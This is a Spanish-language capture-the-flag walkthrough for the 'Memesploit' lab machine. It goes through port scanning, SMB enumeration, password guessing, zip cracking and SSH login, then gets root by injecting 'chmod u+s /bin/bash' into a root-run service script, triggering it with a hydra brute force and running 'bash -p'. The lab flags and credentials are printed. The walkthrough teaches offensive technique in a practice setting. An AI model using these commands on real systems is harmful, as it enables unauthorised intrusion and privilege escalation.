---
icon: flag
---

# CTF Memesploit Intermediate

URL Download CTF = [https://drive.google.com/file/d/1LPxgEbkpZlfHuZaiNYytR47db4naX0Ll/view?usp=sharing](https://drive.google.com/file/d/1LPxgEbkpZlfHuZaiNYytR47db4naX0Ll/view?usp=sharing)

### Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip memesploit.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_mount.sh memesploit.tar
```

Info:

```
___________________¶¶
____________________¶¶__¶_5¶¶
____________5¶5__¶5__¶¶_5¶__¶¶¶5
__________5¶¶¶__¶¶5¶¶¶¶¶5¶¶__5¶¶¶5
_________¶¶¶¶__¶5¶¶¶¶¶¶¶¶¶¶¶__5¶¶¶¶5
_______5¶¶¶¶__¶¶¶¶¶¶¶¶¶¶¶_5¶¶__5¶¶¶¶¶5
______¶¶¶¶¶5_¶¶¶¶¶¶¶¶¶¶¶¶¶5¶¶¶__¶¶¶¶5¶5
_____¶¶¶¶¶¶_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_¶¶¶¶¶¶¶5
____¶¶¶¶¶¶¶_¶¶¶5¶¶¶¶5_¶¶¶¶¶5_5¶_¶¶¶¶¶¶¶¶5
___¶¶¶¶¶¶¶¶__5¶¶¶¶¶¶5___5¶¶¶¶__5¶¶¶¶¶¶¶¶¶5
__¶¶¶¶¶¶¶¶¶¶5__5¶¶¶¶¶¶5__5¶¶5_5¶¶¶¶¶¶¶¶¶¶¶
_5¶¶¶¶¶¶¶¶¶¶¶¶_5¶¶¶¶¶¶¶¶¶5__5¶¶¶¶¶¶¶¶¶¶¶¶¶5
_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶_5¶¶¶¶
5¶¶¶¶¶¶¶¶¶¶¶¶5___5¶¶¶¶¶¶¶5__¶¶¶¶5_¶¶¶5_¶¶¶¶
¶¶¶¶¶¶¶¶_¶¶5_5¶5__¶¶¶¶¶¶¶¶¶5_5¶¶¶_5¶¶¶_5¶¶¶5
¶5¶¶¶¶¶5_¶¶_5¶¶¶¶¶_¶¶¶¶¶¶¶¶¶¶5_5¶¶_5¶¶¶_¶¶¶5
¶¶¶¶_¶¶__¶__¶¶¶¶¶¶5_5¶¶¶¶¶¶¶¶¶¶5_¶¶_5¶¶_5¶¶¶
¶¶¶5_5¶______5¶¶5¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶5_¶¶_5¶5_¶5¶
5¶¶____5¶¶¶¶5_____5¶¶¶¶¶¶¶5_¶¶¶¶¶5_¶__¶¶_5¶¶
_¶¶__5¶¶¶¶¶¶¶¶¶¶5____5¶¶¶¶¶¶_¶¶¶¶¶_____¶5_¶¶
_¶¶___5¶¶¶¶¶¶¶¶¶__________5¶5_¶¶¶¶¶____¶¶_¶¶
_¶¶_______5¶¶¶¶¶¶5____________¶¶¶¶¶_____¶_¶¶
_5¶5________5¶¶_¶¶¶¶5________5¶¶¶¶¶_______¶¶
__¶¶__________¶___¶¶¶¶¶5___5¶¶¶¶¶¶5_______¶5
__¶¶____________5¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶________¶
___¶________________5¶¶¶¶¶¶¶¶5_¶¶
___¶__________5¶¶¶¶¶¶¶¶5¶¶¶5__5¶5
_____________________5¶¶¶5____¶5

                                           
 ##   ##    ##       ####   ###  ##  #######  ######   ####       ##     ######    #####  
 ##   ##   ####     ##  ##   ##  ##   ##   #   ##  ##   ##       ####     ##  ##  ##   ## 
 ##   ##  ##  ##   ##        ## ##    ## #     ##  ##   ##      ##  ##    ##  ##  #       
 #######  ##  ##   ##        ####     ####     #####    ##      ##  ##    #####    #####  
 ##   ##  ######   ##        ## ##    ## #     ## ##    ##   #  ######    ##  ##       ## 
 ##   ##  ##  ##    ##  ##   ##  ##   ##   #   ##  ##   ##  ##  ##  ##    ##  ##  ##   ## 
 ##   ##  ##  ##     ####   ###  ##  #######  #### ##  #######  ##  ##   ######    #####  
                                         

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.18.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-01 05:29 EDT
Nmap scan report for 172.18.0.2
Host is up (0.000030s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b1:4d:aa:b4:22:b4:7c:2e:53:3d:41:69:81:e3:c8:48 (ECDSA)
|_  256 59:16:7a:02:50:bd:8d:b5:06:30:1c:3d:01:e5:bf:81 (ED25519)
80/tcp  open  http        Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Hacker Landing Page
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
MAC Address: 02:42:AC:12:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2024-09-01T09:30:22
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.58 seconds
```

Vemos que hay un `smb` abierto, por lo que lo enumeraremos de la siguiente forma.

## enum4linux

```shell
enum4linux <IP>
```

Info:

```
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Sep  1 05:30:16 2024

 =========================================( Target Information )=========================================

Target ........... 172.18.0.2
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 =============================( Enumerating Workgroup/Domain on 172.18.0.2 )=============================


[E] Can't find workgroup/domain



 =================================( Nbtstat Information for 172.18.0.2 )=================================

Looking up status of 172.18.0.2
No reply from 172.18.0.2

 ====================================( Session Check on 172.18.0.2 )====================================


[+] Server 172.18.0.2 allows sessions using username '', password ''


 =================================( Getting domain SID for 172.18.0.2 )=================================

Domain Name: WORKGROUP
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup


 ====================================( OS information on 172.18.0.2 )====================================


[E] Can't get OS info with smbclient


[+] Got OS info for 172.18.0.2 from srvinfo: 
	92EE57FC71F4   Wk Sv PrQ Unx NT SNT 92ee57fc71f4 server (Samba, Ubuntu)
	platform_id     :	500
	os version      :	6.1
	server type     :	0x809a03


 ========================================( Users on 172.18.0.2 )========================================

index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: memehydra	Name: memehydra	Desc: 

user:[memehydra] rid:[0x3e8]

 ==================================( Share Enumeration on 172.18.0.2 )==================================

smbXcli_negprot_smb1_done: No compatible protocol selected by server.

	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	share_memehydra Disk      
	IPC$            IPC       IPC Service (92ee57fc71f4 server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.
Protocol negotiation to server 172.18.0.2 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 172.18.0.2

//172.18.0.2/print$	Mapping: DENIED Listing: N/A Writing: N/A
//172.18.0.2/share_memehydra	Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:

NT_STATUS_CONNECTION_REFUSED listing \*
//172.18.0.2/IPC$	Mapping: N/A Listing: N/A Writing: N/A

 =============================( Password Policy Information for 172.18.0.2 )=============================



[+] Attaching to 172.18.0.2 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

	[+] 92EE57FC71F4
	[+] Builtin

[+] Password Info for Domain: 92EE57FC71F4

	[+] Minimum password length: 5
	[+] Password history length: None
	[+] Maximum password age: 37 days 6 hours 21 minutes 
	[+] Password Complexity Flags: 000000

		[+] Domain Refuse Password Change: 0
		[+] Domain Password Store Cleartext: 0
		[+] Domain Password Lockout Admins: 0
		[+] Domain Password No Clear Change: 0
		[+] Domain Password No Anon Change: 0
		[+] Domain Password Complex: 0

	[+] Minimum password age: None
	[+] Reset Account Lockout Counter: 30 minutes 
	[+] Locked Account Duration: 30 minutes 
	[+] Account Lockout Threshold: None
	[+] Forced Log off Time: 37 days 6 hours 21 minutes 



[+] Retieved partial password policy with rpcclient:


Password Complexity: Disabled
Minimum Password Length: 5


 ========================================( Groups on 172.18.0.2 )========================================


[+] Getting builtin groups:


[+]  Getting builtin group memberships:


[+]  Getting local groups:


[+]  Getting local group memberships:


[+]  Getting domain groups:


[+]  Getting domain group memberships:


 ===================( Users on 172.18.0.2 via RID cycling (RIDS: 500-550,1000-1050) )===================


[I] Found new SID: 
S-1-22-1

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[I] Found new SID: 
S-1-5-32

[+] Enumerating users using SID S-1-5-21-4033839703-1658086518-3882213164 and logon username '', password ''

S-1-5-21-4033839703-1658086518-3882213164-501 92EE57FC71F4\nobody (Local User)
S-1-5-21-4033839703-1658086518-3882213164-513 92EE57FC71F4\None (Domain Group)
S-1-5-21-4033839703-1658086518-3882213164-1000 92EE57FC71F4\memehydra (Local User)

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''

S-1-5-32-544 BUILTIN\Administrators (Local Group)
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''

S-1-22-1-1001 Unix User\memesploit (Local User)
S-1-22-1-1002 Unix User\memehydra (Local User)

 ================================( Getting printer info for 172.18.0.2 )================================

No printers returned.


enum4linux complete on Sun Sep  1 05:31:01 2024
```

Vemos que hay un recurso compartido llamado `share_memehydra` con un nombre de usuario relacionado a el llamado `memehydra` pero si intentamos entrar nos pedira contraseña, por lo que seguiremos buscando.

## Puerto 80

Si nos vamos al puerto `80` veremos una pagina web en la que oculta 3 palabras que son las siguientes.

```
fuerzabrutasiempre
memesploit_ctf
memehydra
```

Por lo que probaremos con esas 3 palabras la contraseña del usuario `memehydra` en el `smb`, nos podremos crear un diccionario si queremos.

## Intrusion SMB

Si probamos con la palabra `fuerzabrutasiempre` como contraseña del usuario `memehydra` veremos que es la correcta, por lo que...

```shell
smbclient //<IP>/share_memehydra -U memehydra
```

Y con esto ya estariamos dentro, si listamos veremos un archivo `.zip`.

```
 .                                   D        0  Sat Aug 31 11:15:13 2024
  ..                                  D        0  Sat Aug 31 11:15:13 2024
  secret.zip                          N      224  Sat Aug 31 11:15:06 2024
```

Nos lo descargaremos a nuestro host.

```shell
get secret.zip
```

Y si lo intentamos descomprimir, veremos que nos pedira una contraseña.

## unzip

Si probamos con una de las palabras de antes que encontramos, veremos que funcionara y esa palabra sera `memesploit_ctf`, por lo que haremos lo siguiente.

```shell
unzip secret.zip
```

Metemos como contraseña `memesploit_ctf` y se nos descomprimira un archivo llamado `secret.txt` que contiene lo siguiente.

```
memesploit:metasploitelmejor
```

Veremos que son las credenciales del usuario `memesploit` con su contraseña, por lo que nos conectaremos mediante `ssh`.

## SSH

```shell
ssh memesploit@<IP>
```

Metemos la contraseña obtenida y ya estariamos dentro, por lo que leeremos la flag.

> user.txt

```
58a071849802bb0d1a782f928d5a4121
```

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente.

```
Matching Defaults entries for memesploit on 92ee57fc71f4:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User memesploit may run the following commands on 92ee57fc71f4:
    (ALL : ALL) NOPASSWD: /usr/sbin/service login_monitor restart
```

Veremos que podemos ejecutar como `root` el binario `service` pero en concreto reseteando un servicio que su funcion parece el banear las IP's de los usuarios que intenten hacer fuerza bruta al SSH.

Por lo que buscaremos alguna carpeta de configuracion de ese binario.

```shell
find / -name 'login_monitor' 2>/dev/null
```

Info:

```
/etc/init.d/login_monitor
/etc/login_monitor
```

Vemos que uno es el servicio ya que esta en `init.d/` y el otro es una carpeta donde se aloja la configuracion aparentemente.

```shell
cd /etc/login_monitor
```

Si listamos veremos lo siguiente.

```
total 36
drwxrwx--- 2 root security 4096 Aug 31 17:50 .
drwxr-xr-x 1 root root     4096 Sep  1 11:28 ..
-rwxr-xr-x 1 root root      620 Aug 31 17:50 actionban.sh
-rwxr-xr-x 1 root root      472 Aug 31 17:31 activity.sh
-rw-r--r-- 1 root root      200 Aug 31 17:30 loggin.conf
-rw-r--r-- 1 root root      224 Aug 31 17:29 network.conf
-rwxr-xr-x 1 root root      501 Aug 31 17:30 network.sh
-rw-r--r-- 1 root root      209 Aug 31 17:29 security.conf
-rwxr-xr-x 1 root root      488 Aug 31 17:30 security.sh
```

Pero si vemos de que grupo somos, veremos lo siguiente.

```shell
id
```

Info:

```
uid=1001(memesploit) gid=1001(memesploit) groups=1001(memesploit),100(users),1003(security)
```

Vemos que esa carpeta pertenece al grupo de `security` y nosotros tambien, por lo que podremos aprovechar esa vulnerabilidad, pero antes tendremos que ver donde inyectar el codigo malicioso.

Si leemos el archivo `actionban.sh` veremos lo siguiente.

```bash
#!/bin/bash

# Ruta del archivo que simula el registro de bloqueos
BLOCK_LOG="/tmp/block_log.txt"

# Función para generar una IP aleatoria
generate_random_ip() {
    echo "$((RANDOM % 255 + 1)).$((RANDOM % 255 + 1)).$((RANDOM % 255 + 1)).$((RANDOM % 255 + 1))"
}

# Generar una IP aleatoria
IP_TO_BLOCK=$(generate_random_ip)

# Mensaje de simulación
MESSAGE="Simulación de bloqueo de IP: $IP_TO_BLOCK"

# Mostrar el mensaje en la terminal
echo "$MESSAGE"

# Registrar el intento de bloqueo en el archivo
echo "$(date): $MESSAGE" >> "$BLOCK_LOG"

echo "El registro ha sido creado en $BLOCK_LOG con la IP $IP_TO_BLOCK"
```

Genera un archivo en `/tmp` con las IP's bloqueadas y si vamos al `/tmp` veremos el archivo por lo que vemos que esta funcionando ese script y los demas no da señales de que interactue el servicio con ellos.

Por lo que haremos lo siguiente para poder editar el archivo.

```shell
mv actionban.sh actionban.bak
cp actionban.bak actionban.sh
```

Y ahora si podremos editarlo, por lo que haremos lo siguiente.

```shell
nano actionban.sh

#Dentro del nano
<RESTO_DEL_CODIGO>

chmod u+s /bin/bash
```

Lo guardamos y lo reiniciaremos el servicio ya que podemos.

```shell
sudo service login_monitor restart
```

Una vez hecho eso, tiraremos un ataque de `hydra` para que eso se ejecute.

```shell
hydra -l memesploit -P <WORDLIST> ssh://<IP> -t 64
```

Esperamos un rato y si volvemos a donde tenemos la shell del usuario `memesploit` haremos un `ls` para ver la `bash`.

```shell
ls -la /bin/bash
```

Info:

```
-rwsr-xr-x 1 root root 1446024 Mar 31 10:41 /bin/bash
```

Y veremos que ha funcionado, por lo que haremos lo siguiente.

```shell
bash -p
```

Con esto ya seremos `root` y podremos leer la flag.

> root.txt

```
b57069733c1fbdf4795c0b36597c307a
```
